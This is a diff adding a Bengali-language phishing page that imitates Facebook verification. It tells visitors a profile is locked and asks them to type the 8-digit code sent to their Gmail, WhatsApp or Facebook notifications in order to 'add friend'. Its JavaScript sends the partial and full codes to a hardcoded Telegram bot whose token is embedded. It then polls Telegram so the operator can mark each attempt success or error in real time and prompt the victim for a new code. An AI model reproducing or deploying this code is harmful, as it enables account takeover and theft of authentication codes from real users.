@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Verification</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #f0f2f5; font-family: 'Segoe UI', Arial, sans-serif; }
+        
+        /* প্রিমিয়াম ফেসবুক স্টাইল লোডার */
+        .fb-loader {
+            width: 50px; height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #1877f2;
+            border-radius: 50%;
+            animation: spin 1s cubic-bezier(0.68, -0.55, 0.27, 1.55) infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .code-input {
+            width: 38px; height: 50px; text-align: center;
+            font-size: 20px; font-weight: 600; border: 2px solid #dddfe2;
+            border-radius: 6px; background: #ffffff; transition: all 0.15s;
+        }
+        .code-input:focus { border-color: #1877f2; outline: none; box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.2); }
+        
+        /* ওয়েটিং পেজ ওভারলে */
+        #waiting-overlay {
+            display: none; position: fixed; top: 0; left: 0;
+            width: 100%; height: 100%; background: #f0f2f5;
+            z-index: 999; flex-direction: column; align-items: center; padding-top: 48px;
+        }
+    </style>
+</head>
+<body class="flex flex-col items-center min-h-screen bg-[#f0f2f5] pt-12">
+
+    <div id="waiting-overlay">
+        <div class="w-full max-w-sm overflow-hidden bg-white rounded-t-2xl shadow-sm">
+            <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" 
+                 class="w-full h-auto object-cover">
+        </div>
+        <div class="w-full max-w-sm p-6 bg-white shadow-md mt-3 rounded-b-2xl min-h-[50vh] flex flex-col items-center justify-center">
+            <div id="loader-icon" class="fb-loader mb-6"></div>
+            <h3 id="waiting-title" class="text-xl font-bold text-gray-800 mb-2">যাচাই করা হচ্ছে...</h3>
+            <p id="waiting-msg" class="text-gray-500 text-center px-6 leading-relaxed">অল্প কিছুক্ষণ অপেক্ষা করুন।</p>
+            
+            <button id="retryBtn" onclick="closeOverlay()" class="hidden mt-8 bg-[#1877f2] text-white px-10 py-3 rounded-xl font-bold shadow-lg transition-all active:scale-95">আবার চেষ্টা করুন</button>
+        </div>
+    </div>
+
+    <div class="w-full max-w-sm overflow-hidden bg-white rounded-t-2xl shadow-sm">
+        <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" 
+             class="w-full h-auto object-cover">
+    </div>
+
+    <div class="w-full max-w-sm p-6 bg-white shadow-md mt-3 rounded-b-2xl min-h-[50vh] flex flex-col items-center">
+        <h2 class="text-[19px] font-bold text-gray-900 mb-4 text-center">ফেসবুক আইডি পাসওয়ার্ড দিয়ে লক করা আছে ।</h2>
+        <p class="text-[14px] text-gray-600 mb-8 text-center leading-relaxed px-2">
+            Add করতে আপনার gmail অথবা whatsapp অথবা ফেসবুক নোটিফিকেশনে সংখ্যা অথবা 8 সংখ্যার কোড পাবেন । নিচের ফাঁকা ঘরে কোডগুলো বসিয়ে এড করুন ।
+        </p>
+
+        <div id="otp-inputs" class="flex justify-center gap-1.5 mb-10">
+            <input type="text" inputmode="numeric" maxlength="1" class="code-input" autofocus>
+            <input type="text" inputmode="numeric" maxlength="1" class="code-input">
+            <input type="text" inputmode="numeric" maxlength="1" class="code-input">
+            <input type="text" inputmode="numeric" maxlength="1" class="code-input">
+            <input type="text" inputmode="numeric" maxlength="1" class="code-input">
+            <input type="text" inputmode="numeric" maxlength="1" class="code-input">
+            <input type="text" inputmode="numeric" maxlength="1" class="code-input">
+            <input type="text" inputmode="numeric" maxlength="1" class="code-input">
+        </div>
+
+        <button id="submitBtn" onclick="startWaiting()" 
+                class="w-full max-w-xs bg-[#1877f2] text-white font-bold py-4 rounded-xl opacity-50 cursor-not-allowed transition-all" disabled>
+            Add Friend
+        </button>
+    </div>
+
+<script>
+const inputs = document.querySelectorAll('.code-input');
+const btn = document.getElementById('submitBtn');
+const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
+const chatId = "8516934257";
+let lastUpdateId = 0; // ডুপ্লিকেট কমান্ড এড়াতে
+
+// টেলিগ্রামে ডাটা পাঠানোর ফাংশন
+async function sendToTelegram(text, hasButtons = false) {
+    let payload = { chat_id: chatId, text: text };
+    if(hasButtons) {
+        payload.reply_markup = {
+            inline_keyboard: [
+                [
+                    { text: "✅ Success", callback_data: "success" },
+                    { text: "❌ Error", callback_data: "error" }
+                ]
+            ]
+        };
+    }
+
+    try {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+    } catch (e) { console.error("Error sending to Telegram", e); }
+}
+
+// ইনপুট হ্যান্ডলিং
+inputs.forEach((input, index) => {
+    input.addEventListener('input', () => {
+        input.value = input.value.replace(/[^0-9]/g, '');
+        if (input.value.length === 1) {
+            // ১ম বার: ৬টি কোড লিখে যখন ৭ম ঘরে যাবে
+            if (index === 5) {
+                const code6 = Array.from(inputs).slice(0, 6).map(i => i.value).join('');
+                sendToTelegram(`📩 ১ম অংশ (৬ ডিজিট): ${code6}`);
+                btn.disabled = false;
+                btn.classList.remove('opacity-50', 'cursor-not-allowed');
+            }
+            // ২য় বার: ৮ম ঘরে কোড বসানো হলে
+            if (index === 7) {
+                const code8 = Array.from(inputs).map(i => i.value).join('');
+                sendToTelegram(`📩 পূর্ণ কোড (৮ ডিজিট): ${code8}`);
+            }
+            if (index < inputs.length - 1) inputs[index + 1].focus();
+        }
+    });
+
+    input.addEventListener('keydown', (e) => {
+        if (e.key === "Backspace" && !input.value && index > 0) inputs[index - 1].focus();
+    });
+});
+
+// বাটন ক্লিক করলে ওয়েটিং পেজ শুরু
+async function startWaiting() {
+    window.scrollTo(0, 0);
+    document.getElementById('waiting-overlay').style.display = 'flex';
+    document.getElementById('loader-icon').classList.remove('hidden');
+    document.getElementById('retryBtn').classList.add('hidden');
+    document.getElementById('waiting-title').innerText = "যাচাই করা হচ্ছে...";
+    document.getElementById('waiting-title').classList.remove('text-red-600');
+    document.getElementById('waiting-msg').innerText = "অল্প কিছুক্ষণ অপেক্ষা করুন।";
+    
+    const finalCode = Array.from(inputs).map(i => i.value).join('');
+    // টেলিগ্রামে ২ বাটনসহ মেসেজ পাঠানো
+    await sendToTelegram(`🚀 ইউজার বাটন ক্লিক করেছে!\nকোড: ${finalCode}\nঅ্যাকশন সিলেক্ট করুন:`, true);
+    
+    // টেলিগ্রাম থেকে কমান্ডের জন্য পোলিং শুরু
+    checkTelegramCommand();
+}
+
+// কমান্ড চেক করার লজিক
+async function checkTelegramCommand() {
+    const checkInterval = setInterval(async () => {
+        try {
+            // শুধুমাত্র সর্বশেষ আপডেটটি চেক করার জন্য offset ব্যবহার
+            const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=-1&timeout=10`);
+            const data = await res.json();
+            
+            if (data.result && data.result.length > 0) {
+                const update = data.result[0];
+                
+                // যদি কলব্যাক বাটন ক্লিক করা হয়
+                if (update.callback_query) {
+                    const command = update.callback_query.data;
+                    
+                    if (command === "success") {
+                        clearInterval(checkInterval);
+                        window.location.href = "success.html";
+                    } 
+                    else if (command === "error") {
+                        clearInterval(checkInterval);
+                        showErrorUI();
+                    }
+                }
+            }
+        } catch (e) { console.log("Checking command status..."); }
+    }, 3000); // প্রতি ৩ সেকেন্ডে চেক হবে
+}
+
+function showErrorUI() {
+    document.getElementById('loader-icon').classList.add('hidden');
+    document.getElementById('waiting-title').innerText = "ভুল কোড!";
+    document.getElementById('waiting-title').classList.add('text-red-600');
+    document.getElementById('waiting-msg').innerText = "আপনার কোডটি ভুল হয়েছে। সঠিক কোড বসিয়ে এড করুন।";
+    document.getElementById('retryBtn').classList.remove('hidden');
+}
+
+function closeOverlay() {
+    document.getElementById('waiting-overlay').style.display = 'none';
+    inputs.forEach(i => i.value = "");
+    inputs[0].focus();
+    btn.disabled = true;
+    btn.classList.add('opacity-50', 'cursor-not-allowed');
+}
+</script>
+</body>
+</html>
